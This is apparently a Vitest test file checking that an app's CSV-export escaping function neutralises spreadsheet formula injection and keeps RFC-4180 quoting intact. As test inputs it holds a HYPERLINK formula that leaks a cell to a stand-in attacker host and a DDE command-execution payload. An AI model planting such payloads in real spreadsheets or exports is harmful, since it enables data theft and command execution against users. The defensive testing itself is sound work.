import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { csvEscape } from "~/lib/csv.server";

/**
 * CSV exports (audit log + subscribers) hand customer-controlled text —
 * checkout names, emails, line titles, event payload JSON — straight to the
 * merchant's spreadsheet. A value starting with = + - @ (or a tab/CR hiding
 * one) is evaluated as a FORMULA by Excel/Sheets: `=HYPERLINK(...)` exfil
 * links, DDE command execution on permissive setups. csvEscape must therefore
 * neutralize formula triggers (OWASP CSV injection) AND keep RFC-4180 quoting
 * intact — and both export surfaces must share the one hardened
 * implementation, because a private copy per route is exactly how one surface
 * got fixed while the other kept the hole.
 */

describe("csvEscape — spreadsheet formula injection", () => {
  it.each([
    ["=HYPERLINK(\"http://evil.example/\",\"open\")"],
    ["+2+5"],
    ["-2+5"],
    ["@SUM(A1:A9)"],
    ["\t=1+1"],
    ["\r=1+1"],
  ])("neutralizes the formula trigger in %j with a leading single quote", (value) => {
    const out = csvEscape(value);
    const cell = out.startsWith('"') ? out.slice(1, -1).replace(/""/g, '"') : out;
    expect(cell.startsWith("'")).toBe(true);
    // The original value is preserved verbatim after the guard character.
    expect(cell.slice(1)).toBe(value);
  });

  it("a DDE payload comes out defanged AND correctly quoted", () => {
    const attack = "=cmd|' /C calc'!A0";
    const out = csvEscape(attack);
    // Contains no comma/quote/newline → no wrapping, just the guard prefix.
    expect(out).toBe(`'${attack}`);
  });

  it("the classic HYPERLINK-with-comma attack is both defanged and RFC-4180 quoted", () => {
    const attack = '=HYPERLINK("http://evil.example/"&A1,"open")';
    const out = csvEscape(attack);
    expect(out.startsWith("\"'=")).toBe(true);
    expect(out.endsWith('"')).toBe(true);
    expect(out).toContain('""http://evil.example/""'); // inner quotes doubled
  });

  it("benign values are untouched", () => {
    expect(csvEscape("Ada Lovelace")).toBe("Ada Lovelace");
    expect(csvEscape("buyer@cellexia.example")).toBe("buyer@cellexia.example"); // @ not leading…
    expect(csvEscape("2026-08-06T00:00:00.000Z")).toBe("2026-08-06T00:00:00.000Z");
    expect(csvEscape(42)).toBe("42");
    expect(csvEscape(null)).toBe("");
    expect(csvEscape(undefined)).toBe("");
  });

  it("quoting still applies to commas, quotes and newlines", () => {
    expect(csvEscape('a,b')).toBe('"a,b"');
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
    expect(csvEscape("line1\nline2")).toBe('"line1\nline2"');
  });

  it("payload-JSON cells (always {, [ or \" first) never gain a guard character", () => {
    const json = JSON.stringify({ amountCents: -500, note: "=SUM(A1)" });
    const out = csvEscape(json);
    expect(out.startsWith('"{')).toBe(true); // quoted for the inner quotes, no leading '
  });
});

describe("both export surfaces use the ONE shared csvEscape", () => {
  function src(rel: string): string {
    return readFileSync(fileURLToPath(new URL(rel, import.meta.url)), "utf8");
  }

  it.each([
    ["app/routes/app.audit.tsx", "../app/routes/app.audit.tsx"],
    ["app/routes/app.subscribers.tsx", "../app/routes/app.subscribers.tsx"],
  ])("%s imports ~/lib/csv.server and defines no private csvEscape", (_name, rel) => {
    const source = src(rel);
    expect(source).toContain('import { csvEscape } from "~/lib/csv.server"');
    expect(source).not.toMatch(/function csvEscape/);
  });

  it("the shared implementation neutralizes before it quotes", () => {
    const source = src("../app/lib/csv.server.ts");
    expect(source).toMatch(/\^\[=\+\\-@\\t\\r\]/); // the OWASP trigger class
  });
});
